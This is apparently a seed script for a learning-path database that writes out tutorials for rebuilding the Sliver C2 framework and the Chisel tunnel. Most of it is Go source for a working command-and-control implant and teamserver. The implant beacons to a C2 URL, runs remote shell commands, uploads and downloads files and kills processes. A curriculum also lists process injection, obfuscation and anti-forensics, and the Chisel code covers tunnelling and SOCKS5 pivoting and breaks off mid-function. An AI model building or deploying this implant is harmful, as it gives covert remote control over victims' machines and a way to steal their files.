import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));

// Sliver C2 & Havoc C2
const paths = [
  {
    name: 'Reimplement: Sliver C2',
    description: 'Build a modern C2 framework in Go with mutual TLS, HTTP/S, DNS, and WireGuard transports',
    icon: 'server',
    color: 'green',
    language: 'Go, Python',
    skills: 'C2 development, Implant design, Cryptography, Protocol design',
    difficulty: 'advanced',
    estimated_weeks: 12,
    schedule: `| Week | Day | Focus | Deliverable |
|------|-----|-------|-------------|
| 1 | 1 | Project architecture | Go project structure |
| 1 | 2 | gRPC setup | Server/client RPC |
| 1 | 3 | Protobuf definitions | Message types |
| 1 | 4 | Database layer | SQLite/GORM models |
| 1 | 5 | Config management | YAML configuration |
| 2 | 1 | mTLS infrastructure | Certificate generation |
| 2 | 2 | CA management | Root/intermediate CAs |
| 2 | 3 | Client certificates | Per-implant certs |
| 2 | 4 | Certificate rotation | Auto-renewal |
| 2 | 5 | TLS listener | MTLS transport |
| 3 | 1 | HTTP listener | HTTP/S transport |
| 3 | 2 | HTTP C2 profiles | Malleable profiles |
| 3 | 3 | Domain fronting | CDN support |
| 3 | 4 | HTTP multiplexing | Concurrent sessions |
| 3 | 5 | HTTPS staging | Staged payloads |
| 4 | 1 | DNS protocol | DNS transport |
| 4 | 2 | DNS encoding | Data encoding |
| 4 | 3 | DNS server | Authoritative DNS |
| 4 | 4 | DNS tunneling | Full tunnel |
| 4 | 5 | DNS caching | Response caching |
| 5 | 1 | WireGuard transport | WG tunnel |
| 5 | 2 | Peer management | Key exchange |
| 5 | 3 | NAT traversal | Hole punching |
| 5 | 4 | Transport switching | Dynamic transport |
| 5 | 5 | Pivot support | Implant-to-implant |
| 6 | 1 | Implant core | Base implant |
| 6 | 2 | Platform abstraction | Cross-platform |
| 6 | 3 | Command handlers | Task execution |
| 6 | 4 | File operations | Upload/download |
| 6 | 5 | Process operations | Spawn/inject |
| 7 | 1 | Shellcode generation | Platform shellcode |
| 7 | 2 | Reflective loading | In-memory execution |
| 7 | 3 | Process injection | Migration |
| 7 | 4 | DLL injection | LoadLibrary/Manual |
| 7 | 5 | BOF loader | Beacon object files |
| 8 | 1 | Encryption layer | AES-GCM/ChaCha20 |
| 8 | 2 | Key exchange | ECDH key exchange |
| 8 | 3 | Session encryption | Per-session keys |
| 8 | 4 | Message signing | Ed25519 signatures |
| 8 | 5 | Anti-forensics | Memory wiping |
| 9 | 1 | Operator console | CLI interface |
| 9 | 2 | Multi-user support | RBAC |
| 9 | 3 | Session management | Implant tracking |
| 9 | 4 | Task queuing | Async commands |
| 9 | 5 | Output handling | Structured output |
| 10 | 1 | Builder subsystem | Implant compilation |
| 10 | 2 | Obfuscation | String encryption |
| 10 | 3 | Symbol stripping | Binary hardening |
| 10 | 4 | Cross-compilation | Multi-platform |
| 10 | 5 | Stager generation | Staged payloads |
| 11 | 1 | Armory system | Extension loading |
| 11 | 2 | COFF loader | Windows extensions |
| 11 | 3 | .NET assembly | CLR hosting |
| 11 | 4 | Python extensions | Scripting |
| 11 | 5 | Alias system | Custom commands |
| 12 | 1 | Teamserver | Multi-operator |
| 12 | 2 | Event system | Real-time updates |
| 12 | 3 | Logging/audit | Operation logging |
| 12 | 4 | API design | REST/gRPC API |
| 12 | 5 | Final integration | Complete C2 |`,
    modules: [
      {
        name: 'Implant Core',
        description: 'Build the cross-platform implant',
        tasks: [
          {
            title: 'Go Implant Architecture',
            description: 'Core implant structure with transport abstraction',
            details: `# Sliver-Style Implant in Go

\`\`\`go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

// Compile-time configuration (obfuscated in real builds)
var (
	ServerURL     = "https://c2.example.com"
	ServerPubKey  = "" // Base64 encoded server public key
	ImplantID     = "" // Generated at build time
	SleepTime     = 60 * time.Second
	Jitter        = 0.2
	MaxRetries    = 10
)

// Message types
type MessageType uint32

const (
	MsgRegister   MessageType = 1
	MsgBeacon     MessageType = 2
	MsgTask       MessageType = 3
	MsgTaskOutput MessageType = 4
	MsgFile       MessageType = 5
)

// Envelope wraps all messages
type Envelope struct {
	Type      MessageType \`json:"type"\`
	ID        string      \`json:"id"\`
	Timestamp int64       \`json:"ts"\`
	Data      []byte      \`json:"data"\`
}

// Registration message
type Register struct {
	ID       string \`json:"id"\`
	Hostname string \`json:"hostname"\`
	Username string \`json:"username"\`
	OS       string \`json:"os"\`
	Arch     string \`json:"arch"\`
	PID      int    \`json:"pid"\`
	UID      string \`json:"uid"\`
}

// Task from server
type Task struct {
	ID      string            \`json:"id"\`
	Type    string            \`json:"type"\`
	Args    map[string]string \`json:"args"\`
	Timeout int               \`json:"timeout"\`
}

// TaskOutput to server
type TaskOutput struct {
	TaskID  string \`json:"task_id"\`
	Success bool   \`json:"success"\`
	Output  []byte \`json:"output"\`
	Error   string \`json:"error,omitempty"\`
}

// Transport interface for different C2 channels
type Transport interface {
	Send(data []byte) error
	Receive() ([]byte, error)
	Close() error
}

// HTTPTransport implements HTTP(S) transport
type HTTPTransport struct {
	client    *http.Client
	serverURL string
	sessionID string
	mutex     sync.Mutex
}

func NewHTTPTransport(serverURL string, caCert []byte) (*HTTPTransport, error) {
	// Create TLS config with server CA
	certPool := x509.NewCertPool()
	if !certPool.AppendCertsFromPEM(caCert) {
		return nil, fmt.Errorf("failed to parse CA cert")
	}

	tlsConfig := &tls.Config{
		RootCAs:            certPool,
		InsecureSkipVerify: false,
		MinVersion:         tls.VersionTLS12,
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
		Timeout: 30 * time.Second,
	}

	return &HTTPTransport{
		client:    client,
		serverURL: serverURL,
	}, nil
}

func (t *HTTPTransport) Send(data []byte) error {
	t.mutex.Lock()
	defer t.mutex.Unlock()

	req, err := http.NewRequest("POST", t.serverURL+"/api/beacon", bytes.NewReader(data))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Session-ID", t.sessionID)

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned %d", resp.StatusCode)
	}

	return nil
}

func (t *HTTPTransport) Receive() ([]byte, error) {
	t.mutex.Lock()
	defer t.mutex.Unlock()

	req, err := http.NewRequest("GET", t.serverURL+"/api/tasks", nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("X-Session-ID", t.sessionID)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil // No tasks
	}

	return io.ReadAll(resp.Body)
}

func (t *HTTPTransport) Close() error {
	return nil
}

// Crypto handles encryption/decryption
type Crypto struct {
	privateKey *ecdsa.PrivateKey
	serverKey  *ecdsa.PublicKey
	sessionKey []byte
}

func NewCrypto() (*Crypto, error) {
	// Generate ephemeral key pair
	privateKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}

	return &Crypto{
		privateKey: privateKey,
	}, nil
}

func (c *Crypto) SetServerKey(pubKeyBytes []byte) error {
	pubKey, err := x509.ParsePKIXPublicKey(pubKeyBytes)
	if err != nil {
		return err
	}

	ecdsaKey, ok := pubKey.(*ecdsa.PublicKey)
	if !ok {
		return fmt.Errorf("not an ECDSA public key")
	}

	c.serverKey = ecdsaKey
	return nil
}

func (c *Crypto) DeriveSessionKey() error {
	// ECDH key exchange
	x, _ := c.serverKey.Curve.ScalarMult(
		c.serverKey.X,
		c.serverKey.Y,
		c.privateKey.D.Bytes(),
	)

	// Derive AES key from shared secret
	hash := sha256.Sum256(x.Bytes())
	c.sessionKey = hash[:]
	return nil
}

func (c *Crypto) Encrypt(plaintext []byte) ([]byte, error) {
	aead, err := chacha20poly1305.NewX(c.sessionKey)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, aead.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	ciphertext := aead.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

func (c *Crypto) Decrypt(ciphertext []byte) ([]byte, error) {
	aead, err := chacha20poly1305.NewX(c.sessionKey)
	if err != nil {
		return nil, err
	}

	nonceSize := aead.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return aead.Open(nil, nonce, ciphertext, nil)
}

// Implant is the main beacon structure
type Implant struct {
	ID        string
	transport Transport
	crypto    *Crypto
	handlers  map[string]TaskHandler
	running   bool
	mutex     sync.Mutex
}

type TaskHandler func(task *Task) *TaskOutput

func NewImplant(transport Transport, crypto *Crypto) *Implant {
	imp := &Implant{
		ID:        ImplantID,
		transport: transport,
		crypto:    crypto,
		handlers:  make(map[string]TaskHandler),
		running:   true,
	}

	// Register built-in handlers
	imp.registerHandlers()

	return imp
}

func (i *Implant) registerHandlers() {
	i.handlers["shell"] = i.handleShell
	i.handlers["upload"] = i.handleUpload
	i.handlers["download"] = i.handleDownload
	i.handlers["ls"] = i.handleLs
	i.handlers["cd"] = i.handleCd
	i.handlers["pwd"] = i.handlePwd
	i.handlers["ps"] = i.handlePs
	i.handlers["kill"] = i.handleKill
	i.handlers["whoami"] = i.handleWhoami
	i.handlers["sleep"] = i.handleSleep
	i.handlers["exit"] = i.handleExit
}

func (i *Implant) Register() error {
	hostname, _ := os.Hostname()

	reg := Register{
		ID:       i.ID,
		Hostname: hostname,
		Username: os.Getenv("USER"),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
		UID:      fmt.Sprintf("%d", os.Getuid()),
	}

	data, err := json.Marshal(reg)
	if err != nil {
		return err
	}

	envelope := Envelope{
		Type:      MsgRegister,
		ID:        i.ID,
		Timestamp: time.Now().Unix(),
		Data:      data,
	}

	return i.send(envelope)
}

func (i *Implant) send(env Envelope) error {
	data, err := json.Marshal(env)
	if err != nil {
		return err
	}

	encrypted, err := i.crypto.Encrypt(data)
	if err != nil {
		return err
	}

	return i.transport.Send(encrypted)
}

func (i *Implant) Beacon() error {
	// Get tasks from server
	encrypted, err := i.transport.Receive()
	if err != nil {
		return err
	}

	if encrypted == nil {
		return nil // No tasks
	}

	decrypted, err := i.crypto.Decrypt(encrypted)
	if err != nil {
		return err
	}

	var tasks []Task
	if err := json.Unmarshal(decrypted, &tasks); err != nil {
		return err
	}

	// Process tasks
	for _, task := range tasks {
		go i.processTask(&task)
	}

	return nil
}

func (i *Implant) processTask(task *Task) {
	handler, exists := i.handlers[task.Type]
	if !exists {
		i.sendOutput(&TaskOutput{
			TaskID:  task.ID,
			Success: false,
			Error:   fmt.Sprintf("unknown task type: %s", task.Type),
		})
		return
	}

	output := handler(task)
	i.sendOutput(output)
}

func (i *Implant) sendOutput(output *TaskOutput) {
	data, _ := json.Marshal(output)

	envelope := Envelope{
		Type:      MsgTaskOutput,
		ID:        i.ID,
		Timestamp: time.Now().Unix(),
		Data:      data,
	}

	i.send(envelope)
}

// Task handlers
func (i *Implant) handleShell(task *Task) *TaskOutput {
	cmdStr := task.Args["command"]

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}

	output, err := cmd.CombinedOutput()

	if err != nil {
		return &TaskOutput{
			TaskID:  task.ID,
			Success: false,
			Output:  output,
			Error:   err.Error(),
		}
	}

	return &TaskOutput{
		TaskID:  task.ID,
		Success: true,
		Output:  output,
	}
}

func (i *Implant) handleUpload(task *Task) *TaskOutput {
	path := task.Args["path"]
	data := []byte(task.Args["data"]) // Base64 decoded by server

	err := os.WriteFile(path, data, 0644)
	if err != nil {
		return &TaskOutput{
			TaskID:  task.ID,
			Success: false,
			Error:   err.Error(),
		}
	}

	return &TaskOutput{
		TaskID:  task.ID,
		Success: true,
		Output:  []byte(fmt.Sprintf("Uploaded %d bytes to %s", len(data), path)),
	}
}

func (i *Implant) handleDownload(task *Task) *TaskOutput {
	path := task.Args["path"]

	data, err := os.ReadFile(path)
	if err != nil {
		return &TaskOutput{
			TaskID:  task.ID,
			Success: false,
			Error:   err.Error(),
		}
	}

	return &TaskOutput{
		TaskID:  task.ID,
		Success: true,
		Output:  data,
	}
}

func (i *Implant) handleSleep(task *Task) *TaskOutput {
	// Update sleep time
	duration, _ := time.ParseDuration(task.Args["duration"])
	SleepTime = duration

	return &TaskOutput{
		TaskID:  task.ID,
		Success: true,
		Output:  []byte(fmt.Sprintf("Sleep set to %v", duration)),
	}
}

func (i *Implant) handleExit(task *Task) *TaskOutput {
	i.mutex.Lock()
	i.running = false
	i.mutex.Unlock()

	return &TaskOutput{
		TaskID:  task.ID,
		Success: true,
		Output:  []byte("Exiting..."),
	}
}

// Main beacon loop
func (i *Implant) Run() {
	// Initial registration
	for retries := 0; retries < MaxRetries; retries++ {
		if err := i.Register(); err == nil {
			break
		}
		time.Sleep(time.Duration(retries+1) * time.Second)
	}

	// Beacon loop
	for i.running {
		if err := i.Beacon(); err != nil {
			// Log error but continue
		}

		// Sleep with jitter
		jitterDuration := time.Duration(float64(SleepTime) * (1 - Jitter + 2*Jitter*rand.Float64()))
		time.Sleep(jitterDuration)
	}

	i.transport.Close()
}

func main() {
	// Initialize crypto
	crypto, _ := NewCrypto()

	// Initialize transport
	transport, _ := NewHTTPTransport(ServerURL, nil)

	// Create and run implant
	implant := NewImplant(transport, crypto)
	implant.Run()
}
\`\`\``
          }
        ]
      },
      {
        name: 'Server Architecture',
        description: 'Build the C2 teamserver',
        tasks: [
          {
            title: 'gRPC Teamserver',
            description: 'Multi-operator teamserver with gRPC API',
            details: `# Sliver-Style Teamserver

\`\`\`go
package server

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"database/sql"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"

	pb "sliver/proto"
)

// Session represents an active implant session
type Session struct {
	ID         string
	Hostname   string
	Username   string
	OS         string
	Arch       string
	PID        int
	Transport  string
	RemoteAddr string
	LastSeen   time.Time
	Tasks      chan *pb.Task
	mutex      sync.RWMutex
}

// Teamserver manages operators, sessions, and listeners
type Teamserver struct {
	pb.UnimplementedSliverServer

	sessions   map[string]*Session
	operators  map[string]*Operator
	listeners  map[string]Listener
	jobs       map[string]*Job
	events     chan *pb.Event
	db         *sql.DB
	ca         *CertificateAuthority
	mutex      sync.RWMutex
}

// Operator represents a connected operator
type Operator struct {
	Name      string
	Token     string
	Connected time.Time
	EventChan chan *pb.Event
}

// Listener interface for different transports
type Listener interface {
	Start() error
	Stop() error
	Address() string
	Protocol() string
}

// Job represents a running background task
type Job struct {
	ID        string
	Name      string
	Type      string
	StartTime time.Time
	listener  Listener
}

func NewTeamserver(dbPath string) (*Teamserver, error) {
	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		return nil, err
	}

	// Initialize database schema
	if err := initSchema(db); err != nil {
		return nil, err
	}

	// Initialize CA
	ca, err := NewCertificateAuthority()
	if err != nil {
		return nil, err
	}

	ts := &Teamserver{
		sessions:  make(map[string]*Session),
		operators: make(map[string]*Operator),
		listeners: make(map[string]Listener),
		jobs:      make(map[string]*Job),
		events:    make(chan *pb.Event, 1000),
		db:        db,
		ca:        ca,
	}

	// Start event dispatcher
	go ts.dispatchEvents()

	return ts, nil
}

// gRPC Service Implementation

func (ts *Teamserver) GetSessions(ctx context.Context, req *pb.Empty) (*pb.Sessions, error) {
	ts.mutex.RLock()
	defer ts.mutex.RUnlock()

	sessions := make([]*pb.Session, 0, len(ts.sessions))
	for _, s := range ts.sessions {
		sessions = append(sessions, &pb.Session{
			Id:         s.ID,
			Hostname:   s.Hostname,
			Username:   s.Username,
			Os:         s.OS,
			Arch:       s.Arch,
			Pid:        int32(s.PID),
			Transport:  s.Transport,
			RemoteAddr: s.RemoteAddr,
			LastSeen:   s.LastSeen.Unix(),
		})
	}

	return &pb.Sessions{Sessions: sessions}, nil
}

func (ts *Teamserver) InteractSession(stream pb.Sliver_InteractSessionServer) error {
	for {
		req, err := stream.Recv()
		if err != nil {
			return err
		}

		session := ts.getSession(req.SessionId)
		if session == nil {
			stream.Send(&pb.TaskResult{
				Success: false,
				Error:   "Session not found",
			})
			continue
		}

		// Create task for implant
		task := &pb.Task{
			Id:   generateID(),
			Type: req.Type,
			Args: req.Args,
		}

		// Queue task
		select {
		case session.Tasks <- task:
		default:
			stream.Send(&pb.TaskResult{
				Success: false,
				Error:   "Task queue full",
			})
			continue
		}

		// Wait for result (with timeout)
		result := ts.waitForResult(task.Id, 30*time.Second)
		stream.Send(result)
	}
}

func (ts *Teamserver) StartListener(ctx context.Context, req *pb.ListenerConfig) (*pb.Job, error) {
	var listener Listener
	var err error

	switch req.Protocol {
	case "mtls":
		listener, err = ts.newMTLSListener(req)
	case "http":
		listener, err = ts.newHTTPListener(req)
	case "https":
		listener, err = ts.newHTTPSListener(req)
	case "dns":
		listener, err = ts.newDNSListener(req)
	default:
		return nil, fmt.Errorf("unknown protocol: %s", req.Protocol)
	}

	if err != nil {
		return nil, err
	}

	if err := listener.Start(); err != nil {
		return nil, err
	}

	job := &Job{
		ID:        generateID(),
		Name:      req.Name,
		Type:      req.Protocol,
		StartTime: time.Now(),
		listener:  listener,
	}

	ts.mutex.Lock()
	ts.jobs[job.ID] = job
	ts.listeners[req.Name] = listener
	ts.mutex.Unlock()

	ts.emit(&pb.Event{
		Type:    "listener_started",
		Message: fmt.Sprintf("Started %s listener on %s", req.Protocol, listener.Address()),
	})

	return &pb.Job{
		Id:      job.ID,
		Name:    job.Name,
		Type:    job.Type,
		Started: job.StartTime.Unix(),
	}, nil
}

func (ts *Teamserver) GenerateImplant(ctx context.Context, req *pb.ImplantConfig) (*pb.ImplantBuild, error) {
	// Generate unique implant ID
	implantID := generateID()

	// Generate implant certificate
	cert, key, err := ts.ca.GenerateImplantCert(implantID)
	if err != nil {
		return nil, err
	}

	// Build implant with configuration
	builder := &ImplantBuilder{
		ID:          implantID,
		OS:          req.Os,
		Arch:        req.Arch,
		C2Servers:   req.C2Servers,
		MTLSCert:    cert,
		MTLSKey:     key,
		CACert:      ts.ca.CACert(),
		Sleep:       time.Duration(req.Sleep) * time.Second,
		Jitter:      float64(req.Jitter) / 100,
		Obfuscation: req.Obfuscation,
	}

	binary, err := builder.Build()
	if err != nil {
		return nil, err
	}

	// Store in database
	if err := ts.storeImplant(implantID, req, binary); err != nil {
		log.Printf("Failed to store implant: %v", err)
	}

	ts.emit(&pb.Event{
		Type:    "implant_generated",
		Message: fmt.Sprintf("Generated %s/%s implant: %s", req.Os, req.Arch, implantID),
	})

	return &pb.ImplantBuild{
		Id:     implantID,
		Binary: binary,
	}, nil
}

func (ts *Teamserver) Events(req *pb.Empty, stream pb.Sliver_EventsServer) error {
	// Get operator from context
	operator := getOperatorFromContext(stream.Context())
	if operator == nil {
		return fmt.Errorf("unauthorized")
	}

	eventChan := make(chan *pb.Event, 100)
	operator.EventChan = eventChan

	defer func() {
		close(eventChan)
		operator.EventChan = nil
	}()

	for event := range eventChan {
		if err := stream.Send(event); err != nil {
			return err
		}
	}

	return nil
}

// Session management

func (ts *Teamserver) registerSession(sess *Session) {
	ts.mutex.Lock()
	ts.sessions[sess.ID] = sess
	ts.mutex.Unlock()

	ts.emit(&pb.Event{
		Type:    "session_connected",
		Message: fmt.Sprintf("New session: %s@%s (%s)", sess.Username, sess.Hostname, sess.ID[:8]),
	})
}

func (ts *Teamserver) getSession(id string) *Session {
	ts.mutex.RLock()
	defer ts.mutex.RUnlock()
	return ts.sessions[id]
}

func (ts *Teamserver) updateSession(id string) {
	ts.mutex.Lock()
	if sess, ok := ts.sessions[id]; ok {
		sess.LastSeen = time.Now()
	}
	ts.mutex.Unlock()
}

func (ts *Teamserver) removeSession(id string) {
	ts.mutex.Lock()
	if sess, ok := ts.sessions[id]; ok {
		close(sess.Tasks)
		delete(ts.sessions, id)
	}
	ts.mutex.Unlock()

	ts.emit(&pb.Event{
		Type:    "session_disconnected",
		Message: fmt.Sprintf("Session disconnected: %s", id[:8]),
	})
}

// Event handling

func (ts *Teamserver) emit(event *pb.Event) {
	event.Timestamp = time.Now().Unix()
	select {
	case ts.events <- event:
	default:
		// Event queue full, drop oldest
		<-ts.events
		ts.events <- event
	}
}

func (ts *Teamserver) dispatchEvents() {
	for event := range ts.events {
		ts.mutex.RLock()
		for _, op := range ts.operators {
			if op.EventChan != nil {
				select {
				case op.EventChan <- event:
				default:
					// Operator slow, skip
				}
			}
		}
		ts.mutex.RUnlock()
	}
}

// Start gRPC server

func (ts *Teamserver) Start(address string) error {
	// Load server TLS
	cert, err := ts.ca.ServerCert()
	if err != nil {
		return err
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    ts.ca.CertPool(),
	}

	creds := credentials.NewTLS(tlsConfig)

	server := grpc.NewServer(
		grpc.Creds(creds),
		grpc.UnaryInterceptor(ts.authInterceptor),
		grpc.StreamInterceptor(ts.streamAuthInterceptor),
	)

	pb.RegisterSliverServer(server, ts)

	lis, err := net.Listen("tcp", address)
	if err != nil {
		return err
	}

	log.Printf("Teamserver listening on %s", address)
	return server.Serve(lis)
}
\`\`\``
          }
        ]
      }
    ]
  },
  {
    name: 'Reimplement: Chisel',
    description: 'Build a fast TCP/UDP tunnel over HTTP with SOCKS5 support in Go',
    icon: 'shuffle',
    color: 'blue',
    language: 'Go',
    skills: 'Networking, Tunneling, WebSockets, SOCKS5',
    difficulty: 'intermediate',
    estimated_weeks: 4,
    schedule: `| Week | Day | Focus | Deliverable |
|------|-----|-------|-------------|
| 1 | 1 | Project setup | Go module structure |
| 1 | 2 | WebSocket basics | WS connection handling |
| 1 | 3 | HTTP upgrade | Connection upgrade |
| 1 | 4 | Multiplexing | yamux integration |
| 1 | 5 | Basic tunnel | TCP forwarding |
| 2 | 1 | Reverse tunnel | Server-initiated |
| 2 | 2 | SOCKS5 server | SOCKS5 protocol |
| 2 | 3 | SOCKS5 auth | Username/password |
| 2 | 4 | UDP support | UDP over TCP |
| 2 | 5 | Connection pool | Reuse connections |
| 3 | 1 | TLS support | HTTPS tunnels |
| 3 | 2 | Fingerprint bypass | TLS fingerprint |
| 3 | 3 | Proxy support | HTTP proxy |
| 3 | 4 | Retry logic | Auto-reconnect |
| 3 | 5 | Keep-alive | Connection health |
| 4 | 1 | Authentication | Client auth |
| 4 | 2 | Compression | Traffic compression |
| 4 | 3 | Logging | Debug logging |
| 4 | 4 | CLI interface | Cobra CLI |
| 4 | 5 | Integration | Full testing |`,
    modules: [
      {
        name: 'Tunnel Implementation',
        description: 'Core tunneling functionality',
        tasks: [
          {
            title: 'WebSocket Tunnel',
            description: 'TCP tunnel over WebSocket with multiplexing',
            details: `# Chisel-Style Tunnel in Go

\`\`\`go
package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/hashicorp/yamux"
)

// Config holds tunnel configuration
type Config struct {
	Server      string
	Remotes     []string
	Fingerprint string
	Auth        string
	KeepAlive   time.Duration
	MaxRetries  int
	Proxy       string
	SOCKS5      bool
	SOCKS5Addr  string
}

// Client handles the tunnel client
type Client struct {
	config    *Config
	wsConn    *websocket.Conn
	session   *yamux.Session
	running   bool
	mutex     sync.Mutex
}

func NewClient(config *Config) *Client {
	return &Client{
		config:  config,
		running: true,
	}
}

func (c *Client) Connect() error {
	// Parse server URL
	serverURL, err := url.Parse(c.config.Server)
	if err != nil {
		return err
	}

	// Determine WebSocket scheme
	wsScheme := "ws"
	if serverURL.Scheme == "https" {
		wsScheme = "wss"
	}
	serverURL.Scheme = wsScheme

	// Setup TLS if needed
	tlsConfig := &tls.Config{
		InsecureSkipVerify: c.config.Fingerprint == "",
	}

	// Setup dialer with proxy support
	dialer := websocket.Dialer{
		TLSClientConfig:  tlsConfig,
		HandshakeTimeout: 30 * time.Second,
	}

	if c.config.Proxy != "" {
		proxyURL, err := url.Parse(c.config.Proxy)
		if err != nil {
			return err
		}
		dialer.Proxy = http.ProxyURL(proxyURL)
	}

	// Setup headers
	headers := http.Header{}
	if c.config.Auth != "" {
		headers.Set("Authorization", "Basic "+c.config.Auth)
	}

	// Connect
	conn, _, err := dialer.Dial(serverURL.String(), headers)
	if err != nil {
		return err
	}

	c.wsConn = conn

	// Setup yamux for multiplexing
	wsNetConn := NewWebSocketNetConn(conn)
	session, err := yamux.Client(wsNetConn, yamux.DefaultConfig())
	if err != nil {
		conn.Close()
		return err
	}

	c.session = session

	log.Printf("Connected to %s", c.config.Server)

	return nil
}

func (c *Client) Run() error {
	// Start keep-alive
	go c.keepAlive()

	// Start SOCKS5 server if enabled
	if c.config.SOCKS5 {
		go c.startSOCKS5()
	}

	// Setup local forwards
	for _, remote := range c.config.Remotes {
		go c.handleRemote(remote)
	}

	// Wait for session to close
	<-c.session.CloseChan()

	return nil
}

func (c *Client) handleRemote(remote string) {
	// Parse remote: local:remote or R:remote:local
	// For simplicity: local_port:remote_host:remote_port

	localAddr := ":8080" // Parse from remote string
	remoteAddr := "internal:80"

	listener, err := net.Listen("tcp", localAddr)
	if err != nil {
		log.Printf("Failed to listen on %s: %v", localAddr, err)
		return
	}
	defer listener.Close()

	log.Printf("Forwarding %s -> %s", localAddr, remoteAddr)

	for c.running {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go c.forward(conn, remoteAddr)
	}
}

func (c *Client) forward(local net.Conn, remoteAddr string) {
	defer local.Close()

	// Open stream through yamux
	stream, err := c.session.Open()
	if err != nil {
		log.Printf("Failed to open stream: %v", err)
		return
	}
	defer stream.Close()

	// Send target address
	_, err = stream.Write([]byte(remoteAddr + "\\n"))
	if err != nil {
		return
	}

	// Bidirectional copy
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		io.Copy(stream, local)
		wg.Done()
	}()

	go func() {
		io.Copy(local, stream)
		wg.Done()
	}()

	wg.Wait()
}

func (c *Client) keepAlive() {
	ticker := time.NewTicker(c.config.KeepAlive)
	defer ticker.Stop()

	for c.running {
		select {
		case <-ticker.C:
			if err := c.wsConn.WriteMessage(websocket.PingMessage, nil); err != nil {
				log.Printf("Keep-alive failed: %v", err)
				c.running = false
				return
			}
		}
	}
}

func (c *Client) startSOCKS5() {
	server := NewSOCKS5Server(c.session)
	if err := server.ListenAndServe(c.config.SOCKS5Addr); err != nil {
		log.Printf("SOCKS5 server error: %v", err)
	}
}

func (c *Client) Close() {
	c.mutex.Lock()
	c.running = false
	c.mutex.Unlock()

	if c.session != nil {
		c.session.Close()
	}
	if c.wsConn != nil {
		c.wsConn.Close()
	}
}

// Server handles the tunnel server
type Server struct {
	config   *Config
	upgrader websocket.Upgrader
	sessions map[string]*yamux.Session
	mutex    sync.RWMutex
}

func NewServer(config *Config) *Server {
	return &Server{
		config: config,
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		sessions: make(map[string]*yamux.Session),
	}
}

func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Check auth if configured
	if s.config.Auth != "" {
		auth := r.Header.Get("Authorization")
		if auth != "Basic "+s.config.Auth {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}

	// Upgrade to WebSocket
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Upgrade failed: %v", err)
		return
	}

	// Create yamux session
	wsNetConn := NewWebSocketNetConn(conn)
	session, err := yamux.Server(wsNetConn, yamux.DefaultConfig())
	if err != nil {
		conn.Close()
		return
	}

	clientID := r.RemoteAddr
	s.mutex.Lock()
	s.sessions[clientID] = session
	s.mutex.Unlock()

	log.Printf("Client connected: %s", clientID)

	// Handle streams
	go s.handleSession(session, clientID)
}

func (s *Server) handleSession(session *yamux.Session, clientID string) {
	defer func() {
		session.Close()
		s.mutex.Lock()
		delete(s.sessions, clientID)
		s.mutex.Unlock()
		log.Printf("Client disconnected: %s", clientID)
	}()

	for {
		stream, err := session.Accept()
		if err != nil {
			return
		}

		go s.handleStream(stream)
	}
}

func (s *Server) handleStream(stream net.Conn) {
	defer stream.Close()

	// Read target address
	buf := make([]byte, 1024)
	n, err := stream.Read(buf)
	if err != nil {
		return
	}

	target := string(buf[:n-1]) // Remove newline

	// Connect to target
	remote, err := net.Dial("tcp", target)
	if err != nil {
		log.Printf("Failed to connect to %s: %v", target, err)
		return
	}
	defer remote.Close()

	// Bidirectional copy
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		io.Copy(remote, stream)
		wg.Done()
	}()

	go func() {
		io.Copy(stream, remote)
		wg.Done()
	}()

	wg.Wait()
}

func (s *Server) ListenAndServe(addr string) error {
	log.Printf("Server listening on %s", addr)
	return http.ListenAndServe(addr, s)
}

// WebSocketNetConn wraps WebSocket as net.Conn
type WebSocketNetConn struct {
	conn   *websocket.Conn
	reader io.Reader
	mutex  sync.Mutex
}

func NewWebSocketNetConn(conn *websocket.Conn) *WebSocketNetConn {
	return &WebSocketNetConn{conn: conn}
}

func (c *WebSocketNetConn) Read(b []byte) (int, error) {
	c.mutex.Lock()
